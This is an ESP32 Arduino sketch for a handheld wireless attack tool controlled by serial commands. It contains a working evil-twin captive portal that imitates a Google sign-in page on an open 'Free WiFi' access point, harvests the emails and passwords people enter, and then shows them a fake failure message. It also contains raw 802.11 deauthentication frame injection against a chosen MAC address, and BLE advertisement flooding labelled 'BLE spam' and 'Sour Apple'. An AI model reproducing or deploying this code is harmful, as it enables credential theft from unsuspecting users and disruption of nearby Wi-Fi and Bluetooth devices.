#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Adafruit_NeoPixel.h>

// ---------------- NeoPixel Setup ----------------
#define LED_NEOPIXEL_PIN 12 //13 is used by LED_BUITIN for ESP32 Feather
#define NUMPIXELS 1
Adafruit_NeoPixel pixels(NUMPIXELS, LED_NEOPIXEL_PIN, NEO_GRB + NEO_KHZ800);
bool neopixelEnabled = true; // Global flag (always enabled here)

// Color definitions
uint32_t COLOR_BLUE  = pixels.Color(0, 0, 255);
uint32_t COLOR_RED   = pixels.Color(255, 0, 0);
uint32_t COLOR_GREEN = pixels.Color(0, 255, 0);

// Flash the NeoPixel with a specific color for a short time
void neopixelFlash(uint32_t color) {
  if (neopixelEnabled) {
    pixels.setPixelColor(0, color);
    pixels.show();
    delay(50);
    pixels.clear();
    pixels.show();
    delay(50);
  }
}

// ---------------- Captive Portal Variables and Functions ----------------
IPAddress apIP(172, 16, 0, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
WebServer webServer(80);
bool captivePortalActive = false;  // Flag indicating if captive portal is active
String currentAPSSID = "0x4F";       // Default AP SSID starts with "0x4F"
String capturedCredentials = "";

String loginPage() {
  return "<!DOCTYPE html>"
         "<html>"
         "<head>"
         "  <meta name='viewport' content='width=device-width, initial-scale=1'>"
         "  <title>Sign in - Google Account</title>"
         "  <style>"
         "    body { font-family: Roboto, Arial, sans-serif; background-color: #fff; color: #202124; margin: 0; padding: 20px; }"
         "    .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ddd; "
         "                 box-shadow: 0 2px 4px rgba(0,0,0,0.2); border-radius: 8px; background-color: #fff; }"
         "    h2 { text-align: center; color: #202124; margin-bottom: 20px; }"
         "    input[type='text'], input[type='password'] { width: 100%; padding: 10px; margin: 8px 0; "
         "                 border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; background-color: #fff; color: #202124; }"
         "    input[type='submit'] { background-color: #1a73e8; color: white; padding: 10px; "
         "                 border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }"
         "    input[type='submit']:hover { background-color: #1558b0; }"
         "    @media (prefers-color-scheme: dark) {"
         "      body { background-color: #121212; color: #e0e0e0; }"
         "      .container { background-color: #1e1e1e; border-color: #333; }"
         "      h2 { color: #e0e0e0; }"
         "      input[type='text'], input[type='password'] { background-color: #333; color: #e0e0e0; border-color: #555; }"
         "      input[type='submit'] { background-color: #bb86fc; color: #121212; }"
         "      input[type='submit']:hover { background-color: #9a67ea; }"
         "    }"
         "  </style>"
         "</head>"
         "<body>"
         "  <div class='container'>"
         "    <h2>Sign in</h2>"
         "    <form action='/post' method='POST'>"
         "      <input type='text' name='email' placeholder='Email or phone' required><br>"
         "      <input type='password' name='password' placeholder='Enter your password' required><br>"
         "      <input type='submit' value='Next'>"
         "    </form>"
         "  </div>"
         "</body>"
         "</html>";
}

String successPage() {
  return "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><title>Login Failed</title></head>"
         "<body><h2>Login Failed</h2><p>Something went Wrong, Try again at a later time.</p></body></html>";
}

void handleRoot() {
  webServer.send(200, "text/html", loginPage());
}

void handlePost() {
  String email = webServer.arg("email");
  String password = webServer.arg("password");
  capturedCredentials += "Email: " + email + " | Password: " + password + "\n";
  Serial.println("Captured Credentials:");
  Serial.println(capturedCredentials);
  webServer.send(200, "text/html", successPage());
}

void handleNotFound() {
  webServer.sendHeader("Location", String("http://") + apIP.toString(), true);
  webServer.send(302, "text/plain", "");
}

// ---------------- SerialMarauder Functions ----------------
bool debugLedEnabled = true;

void activityLED() {
  if (debugLedEnabled) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(50);
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
  }
}

void scanWiFi() {
  Serial.println("Scanning for Wi-Fi networks...");
  int networks = WiFi.scanNetworks();
  for (int i = 0; i < networks; i++) {
    Serial.printf("%d: %s (RSSI: %d) MAC: %s Channel: %d\n",
                  i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i),
                  WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
    activityLED();
    neopixelFlash(COLOR_GREEN); // Green for Wi-Fi network lists
  }
  Serial.println("Wi-Fi scan complete.");
}

void deauthAttack(const char *targetMAC) {
  uint8_t mac[6];
  sscanf(targetMAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  
  int networks = WiFi.scanNetworks();
  int targetChannel = 1;
  for (int i = 0; i < networks; i++) {
    if (WiFi.BSSIDstr(i).equalsIgnoreCase(targetMAC)) {
      targetChannel = WiFi.channel(i);
      break;
    }
  }
  
  Serial.printf("Switching to channel %d for deauth attack on %s\n", targetChannel, targetMAC);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  
  activityLED();
  neopixelFlash(COLOR_RED); // Red for attacks
  
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    0x00, 0x00, 0x07, 0x00
  };
  
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  esp_wifi_set_promiscuous(false);
  
  Serial.println("Deauth attack attempted.");
}

void scanBLE() {
  Serial.println("Scanning for BLE devices...");
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  BLEScanResults foundDevices = *pBLEScan->start(5, false);
  int count = foundDevices.getCount();
  for (int i = 0; i < count; i++) {
    BLEAdvertisedDevice device = foundDevices.getDevice(i);
    String deviceName = device.haveName() ? device.getName().c_str() : "Unknown";
    Serial.printf("Device %d: %s (Name: %s) (RSSI: %d)\n",
                  i + 1, device.getAddress().toString().c_str(),
                  deviceName.c_str(), device.getRSSI());
    activityLED();
    neopixelFlash(COLOR_BLUE); // Blue for BLE scans
  }
  Serial.println("BLE scan complete.");
}

void blespamAttack() {
  Serial.println("Starting BLE spam attack for 5 seconds...");
  BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advData;
  unsigned long startTime = millis();
  
  while (millis() - startTime < 5000) {
    char payload[32];
    for (int i = 0; i < 31; i++) {
      payload[i] = (char)random(0, 256);
    }
    payload[31] = '\0';
    String randomPayload = String(payload);
    
    advData.setManufacturerData(randomPayload);
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setScanResponseData(advData);
    
    activityLED();
    neopixelFlash(COLOR_RED); // Red for attacks
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();
    yield();
  }
  Serial.println("BLE spam attack complete.");
}

void sourAppleAttack() {
  Serial.println("Starting Sour Apple attack for 5 seconds...");
  BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advData;
  
  String exploitPayload = String('A', 31);
  advData.setManufacturerData(exploitPayload);
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->setScanResponseData(advData);
  
  unsigned long startTime = millis();
  while (millis() - startTime < 5000) {
    activityLED();
    neopixelFlash(COLOR_RED); // Red for attacks
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();
    yield();
  }
  Serial.println("Sour Apple attack complete.");
}

void toggleDebugLED() {
  debugLedEnabled = !debugLedEnabled;
  Serial.print("Debug LED is now ");
  Serial.println(debugLedEnabled ? "ENABLED" : "DISABLED");
}

void printHelp() {
  Serial.println("Available commands:");
  Serial.println("  scan         - Wi-Fi scan");
  Serial.println("  deauth <MAC> - Deauth attack");
  Serial.println("  blescan      - BLE scan");
  Serial.println("  blespam      - BLE spam attack (5 sec)");
  Serial.println("  sourapple    - Sour Apple attack (5 sec, fixed payload)");
  Serial.println("  led          - Toggle debug LED flashing");
  Serial.println("  neopixel <i> - Set NeoPixel brightness to <i> (0-255)");
  Serial.println("  help         - Display this help message");
  Serial.println("  portal       - Toggle captive portal SSID (between '0x4F' and 'Free WiFi')");
  Serial.println("  stopportal   - Deactivate captive portal");
}

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);

  // Initialize NeoPixel and set default brightness to 10
  pixels.begin();
  pixels.setBrightness(10);
  pixels.clear();
  pixels.show();

  Serial.begin(115200);

  // Initialize BLE
  BLEDevice::init("");

  // Setup Wi-Fi in AP mode for SerialMarauder functions (captive portal remains off by default)
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(currentAPSSID.c_str());
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());

  // Setup captive portal routes (but do not start the server yet)
  webServer.on("/", handleRoot);
  webServer.on("/post", HTTP_POST, handlePost);
  webServer.onNotFound(handleNotFound);

  Serial.println("Available commands via Serial:");
  Serial.println("  scan         - Wi-Fi scan");
  Serial.println("  deauth <MAC> - Deauth attack");
  Serial.println("  blescan      - BLE scan");
  Serial.println("  blespam      - BLE spam attack (5 sec)");
  Serial.println("  sourapple    - Sour Apple attack (5 sec, fixed payload)");
  Serial.println("  led          - Toggle debug LED flashing");
  Serial.println("  neopixel <i> - Set NeoPixel brightness to <i> (0-255)");
  Serial.println("  help         - Display this help message");
  Serial.println("  portal       - Toggle captive portal SSID (between '0x4F' and 'Free WiFi')");
  Serial.println("  stopportal   - Deactivate captive portal");
}

void loop() {
  if (captivePortalActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    
    if (command == "scan") {
      scanWiFi();
    } else if (command.startsWith("deauth ")) {
      String targetMAC = command.substring(7);
      deauthAttack(targetMAC.c_str());
    } else if (command == "blescan") {
      scanBLE();
    } else if (command == "blespam") {
      blespamAttack();
    } else if (command == "sourapple") {
      sourAppleAttack();
    } else if (command == "led") {
      toggleDebugLED();
    } else if (command.startsWith("neopixel ")) {
      String brightnessStr = command.substring(9);
      int brightness = brightnessStr.toInt();
      if (brightness < 0) brightness = 0;
      if (brightness > 255) brightness = 255;
      pixels.setBrightness(brightness);
      pixels.show();
      Serial.print("NeoPixel brightness set to ");
      Serial.println(brightness);
    } else if (command == "help") {
      printHelp();
    } else if (command == "portal") {
      if (!captivePortalActive) {
        currentAPSSID = "0x4F";
        dnsServer.start(53, "*", apIP);
        webServer.begin();
        captivePortalActive = true;
        WiFi.softAP(currentAPSSID.c_str());
        Serial.print("Captive portal activated with SSID: ");
        Serial.println(currentAPSSID);
      } else {
        if (currentAPSSID == "0x4F") {
          currentAPSSID = "Free WiFi";
        } else {
          currentAPSSID = "0x4F";
        }
        WiFi.softAP(currentAPSSID.c_str());
        Serial.print("Captive portal SSID changed to: ");
        Serial.println(currentAPSSID);
      }
    } else if (command == "stopportal") {
      if (captivePortalActive) {
        webServer.stop();
        captivePortalActive = false;
        Serial.println("Captive portal deactivated.");
      } else {
        Serial.println("Captive portal is not active.");
      }
    } else {
      Serial.println("Invalid command. Type 'help' for available commands.");
    }
  }
  
  // Add a small delay to allow watchdog to be fed
  delay(1);
}
